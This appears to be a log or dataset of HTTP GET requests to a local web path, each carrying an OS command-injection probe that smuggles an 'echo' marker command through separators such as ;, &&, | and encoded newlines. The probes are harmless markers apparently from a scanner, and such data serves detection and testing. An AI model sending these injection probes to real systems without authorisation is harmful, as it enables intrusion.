+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo EXNHRL$((16+83))$(echo EXNHRL)EXNHRL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo EXNHRL$((16+83))$(echo EXNHRL)EXNHRL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UOTTTR$((95+22))$(echo UOTTTR)UOTTTR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UOTTTR$((95+22))$(echo UOTTTR)UOTTTR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UOTTTR$((95+22))$(echo UOTTTR)UOTTTR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UOTTTR$((95+22))$(echo UOTTTR)UOTTTR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho HNSTUS$((44+61))$(echo HNSTUS)HNSTUS||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho HNSTUS$((44+61))$(echo HNSTUS)HNSTUS||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho HNSTUS$((44+61))$(echo HNSTUS)HNSTUS||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho HNSTUS$((44+61))$(echo HNSTUS)HNSTUS||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho DWWBKN$((50+15))$(echo DWWBKN)DWWBKN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho DWWBKN$((50+15))$(echo DWWBKN)DWWBKN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho DWWBKN$((50+15))$(echo DWWBKN)DWWBKN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho DWWBKN$((50+15))$(echo DWWBKN)DWWBKN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QDOJSB$((27+15))$(echo QDOJSB)QDOJSB #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QDOJSB$((27+15))$(echo QDOJSB)QDOJSB #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QDOJSB$((27+15))$(echo QDOJSB)QDOJSB #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QDOJSB$((27+15))$(echo QDOJSB)QDOJSB #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo MHGAXA$((0+22))$(echo MHGAXA)MHGAXA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo MHGAXA$((0+22))$(echo MHGAXA)MHGAXA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo MHGAXA$((0+22))$(echo MHGAXA)MHGAXA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo MHGAXA$((0+22))$(echo MHGAXA)MHGAXA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YKPTPA$((17+16))$(echo YKPTPA)YKPTPA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YKPTPA$((17+16))$(echo YKPTPA)YKPTPA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YKPTPA$((17+16))$(echo YKPTPA)YKPTPA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YKPTPA$((17+16))$(echo YKPTPA)YKPTPA #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YCRSDC$((21+40))$(echo YCRSDC)YCRSDC #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YCRSDC$((21+40))$(echo YCRSDC)YCRSDC #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YCRSDC$((21+40))$(echo YCRSDC)YCRSDC #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YCRSDC$((21+40))$(echo YCRSDC)YCRSDC #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo WGSPHF$((70+56))$(echo WGSPHF)WGSPHF #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo WGSPHF$((70+56))$(echo WGSPHF)WGSPHF #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo WGSPHF$((70+56))$(echo WGSPHF)WGSPHF #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo WGSPHF$((70+56))$(echo WGSPHF)WGSPHF #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo RPOWPE$((4+45))$(echo RPOWPE)RPOWPE #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo RPOWPE$((4+45))$(echo RPOWPE)RPOWPE #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo RPOWPE$((4+45))$(echo RPOWPE)RPOWPE #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo RPOWPE$((4+45))$(echo RPOWPE)RPOWPE #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WAMXTI$((55+89))$(echo WAMXTI)WAMXTI #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WAMXTI$((55+89))$(echo WAMXTI)WAMXTI #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WAMXTI$((55+89))$(echo WAMXTI)WAMXTI #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WAMXTI$((55+89))$(echo WAMXTI)WAMXTI #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo PFITGK$((62+34))$(echo PFITGK)PFITGK #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo PFITGK$((62+34))$(echo PFITGK)PFITGK #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo PFITGK$((62+34))$(echo PFITGK)PFITGK #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo PFITGK$((62+34))$(echo PFITGK)PFITGK #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo SKQKQO$((71+11))$(echo SKQKQO)SKQKQO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo SKQKQO$((71+11))$(echo SKQKQO)SKQKQO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo SKQKQO$((71+11))$(echo SKQKQO)SKQKQO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo SKQKQO$((71+11))$(echo SKQKQO)SKQKQO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LXQZRO$((81+6))$(echo LXQZRO)LXQZRO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LXQZRO$((81+6))$(echo LXQZRO)LXQZRO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LXQZRO$((81+6))$(echo LXQZRO)LXQZRO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LXQZRO$((81+6))$(echo LXQZRO)LXQZRO #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JZGXFV$((45+28))$(echo JZGXFV)JZGXFV #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JZGXFV$((45+28))$(echo JZGXFV)JZGXFV #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JZGXFV$((45+28))$(echo JZGXFV)JZGXFV #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JZGXFV$((45+28))$(echo JZGXFV)JZGXFV #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UYDNYU$((62+83))$(echo UYDNYU)UYDNYU #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UYDNYU$((62+83))$(echo UYDNYU)UYDNYU #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UYDNYU$((62+83))$(echo UYDNYU)UYDNYU #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo UYDNYU$((62+83))$(echo UYDNYU)UYDNYU #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho WPHRXR$((73+15))$(echo WPHRXR)WPHRXR #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho WPHRXR$((73+15))$(echo WPHRXR)WPHRXR #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho WPHRXR$((73+15))$(echo WPHRXR)WPHRXR #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho WPHRXR$((73+15))$(echo WPHRXR)WPHRXR #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho FBTGYZ$((41+37))$(echo FBTGYZ)FBTGYZ #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho FBTGYZ$((41+37))$(echo FBTGYZ)FBTGYZ #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho FBTGYZ$((41+37))$(echo FBTGYZ)FBTGYZ #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho FBTGYZ$((41+37))$(echo FBTGYZ)FBTGYZ #				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PJNASI$((86+29))$(echo PJNASI)PJNASI//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PJNASI$((86+29))$(echo PJNASI)PJNASI//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PJNASI$((86+29))$(echo PJNASI)PJNASI//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PJNASI$((86+29))$(echo PJNASI)PJNASI//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NUILQV$((73+43))$(echo NUILQV)NUILQV//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NUILQV$((73+43))$(echo NUILQV)NUILQV//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NUILQV$((73+43))$(echo NUILQV)NUILQV//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NUILQV$((73+43))$(echo NUILQV)NUILQV//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SSKVPB$((57+10))$(echo SSKVPB)SSKVPB//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SSKVPB$((57+10))$(echo SSKVPB)SSKVPB//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SSKVPB$((57+10))$(echo SSKVPB)SSKVPB//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SSKVPB$((57+10))$(echo SSKVPB)SSKVPB//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo LBKNAL$((77+70))$(echo LBKNAL)LBKNAL//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo LBKNAL$((77+70))$(echo LBKNAL)LBKNAL//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo LBKNAL$((77+70))$(echo LBKNAL)LBKNAL//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo LBKNAL$((77+70))$(echo LBKNAL)LBKNAL//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VABQDO$((85+98))$(echo VABQDO)VABQDO//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VABQDO$((85+98))$(echo VABQDO)VABQDO//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VABQDO$((85+98))$(echo VABQDO)VABQDO//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VABQDO$((85+98))$(echo VABQDO)VABQDO//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JQLPUB$((13+11))$(echo JQLPUB)JQLPUB//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BFSPAA$((64+9))$(echo BFSPAA)BFSPAA//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BFSPAA$((64+9))$(echo BFSPAA)BFSPAA//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BFSPAA$((64+9))$(echo BFSPAA)BFSPAA//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BFSPAA$((64+9))$(echo BFSPAA)BFSPAA//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EGAOGQ$((3+71))$(echo EGAOGQ)EGAOGQ//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EGAOGQ$((3+71))$(echo EGAOGQ)EGAOGQ//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EGAOGQ$((3+71))$(echo EGAOGQ)EGAOGQ//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EGAOGQ$((3+71))$(echo EGAOGQ)EGAOGQ//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EAKGUT$((19+17))$(echo EAKGUT)EAKGUT//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EAKGUT$((19+17))$(echo EAKGUT)EAKGUT//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EAKGUT$((19+17))$(echo EAKGUT)EAKGUT//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EAKGUT$((19+17))$(echo EAKGUT)EAKGUT//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KCRYWC$((39+9))$(echo KCRYWC)KCRYWC//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KCRYWC$((39+9))$(echo KCRYWC)KCRYWC//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KCRYWC$((39+9))$(echo KCRYWC)KCRYWC//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KCRYWC$((39+9))$(echo KCRYWC)KCRYWC//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TVFSWG$((22+24))$(echo TVFSWG)TVFSWG//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TVFSWG$((22+24))$(echo TVFSWG)TVFSWG//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TVFSWG$((22+24))$(echo TVFSWG)TVFSWG//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TVFSWG$((22+24))$(echo TVFSWG)TVFSWG//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo DNIPOU$((10+48))$(echo DNIPOU)DNIPOU//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo DNIPOU$((10+48))$(echo DNIPOU)DNIPOU//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo DNIPOU$((10+48))$(echo DNIPOU)DNIPOU//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo DNIPOU$((10+48))$(echo DNIPOU)DNIPOU//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ACBFCW$((19+84))$(echo ACBFCW)ACBFCW//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ACBFCW$((19+84))$(echo ACBFCW)ACBFCW//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ACBFCW$((19+84))$(echo ACBFCW)ACBFCW//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ACBFCW$((19+84))$(echo ACBFCW)ACBFCW//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho WXQEFD$((61+85))$(echo WXQEFD)WXQEFD//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho WXQEFD$((61+85))$(echo WXQEFD)WXQEFD//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho WXQEFD$((61+85))$(echo WXQEFD)WXQEFD//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho WXQEFD$((61+85))$(echo WXQEFD)WXQEFD//				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo XQDJAC$((56+77))$(echo XQDJAC)XQDJAC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo XQDJAC$((56+77))$(echo XQDJAC)XQDJAC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo XQDJAC$((56+77))$(echo XQDJAC)XQDJAC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo XQDJAC$((56+77))$(echo XQDJAC)XQDJAC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ZDWJRM$((94+22))$(echo ZDWJRM)ZDWJRM\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ZDWJRM$((94+22))$(echo ZDWJRM)ZDWJRM\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ZDWJRM$((94+22))$(echo ZDWJRM)ZDWJRM\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ZDWJRM$((94+22))$(echo ZDWJRM)ZDWJRM\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo EQWJQP$((3+40))$(echo EQWJQP)EQWJQP\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo OQSOMU$((27+57))$(echo OQSOMU)OQSOMU\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo OQSOMU$((27+57))$(echo OQSOMU)OQSOMU\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo OQSOMU$((27+57))$(echo OQSOMU)OQSOMU\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo OQSOMU$((27+57))$(echo OQSOMU)OQSOMU\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KKXOPC$((16+55))$(echo KKXOPC)KKXOPC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KKXOPC$((16+55))$(echo KKXOPC)KKXOPC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KKXOPC$((16+55))$(echo KKXOPC)KKXOPC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KKXOPC$((16+55))$(echo KKXOPC)KKXOPC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo NYVBRS$((52+56))$(echo NYVBRS)NYVBRS\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo NYVBRS$((52+56))$(echo NYVBRS)NYVBRS\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo NYVBRS$((52+56))$(echo NYVBRS)NYVBRS\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo NYVBRS$((52+56))$(echo NYVBRS)NYVBRS\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BKMCKC$((3+23))$(echo BKMCKC)BKMCKC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BKMCKC$((3+23))$(echo BKMCKC)BKMCKC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BKMCKC$((3+23))$(echo BKMCKC)BKMCKC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BKMCKC$((3+23))$(echo BKMCKC)BKMCKC\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JXXTBI$((94+11))$(echo JXXTBI)JXXTBI\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JXXTBI$((94+11))$(echo JXXTBI)JXXTBI\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JXXTBI$((94+11))$(echo JXXTBI)JXXTBI\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JXXTBI$((94+11))$(echo JXXTBI)JXXTBI\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZWWQDY$((4+69))$(echo ZWWQDY)ZWWQDY\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZWWQDY$((4+69))$(echo ZWWQDY)ZWWQDY\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZWWQDY$((4+69))$(echo ZWWQDY)ZWWQDY\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZWWQDY$((4+69))$(echo ZWWQDY)ZWWQDY\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZTXSKQ$((48+2))$(echo ZTXSKQ)ZTXSKQ\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZTXSKQ$((48+2))$(echo ZTXSKQ)ZTXSKQ\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZTXSKQ$((48+2))$(echo ZTXSKQ)ZTXSKQ\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZTXSKQ$((48+2))$(echo ZTXSKQ)ZTXSKQ\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TACQCO$((62+6))$(echo TACQCO)TACQCO\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TACQCO$((62+6))$(echo TACQCO)TACQCO\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TACQCO$((62+6))$(echo TACQCO)TACQCO\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo TACQCO$((62+6))$(echo TACQCO)TACQCO\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo GCDHIF$((57+20))$(echo GCDHIF)GCDHIF\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo GCDHIF$((57+20))$(echo GCDHIF)GCDHIF\\				/web/
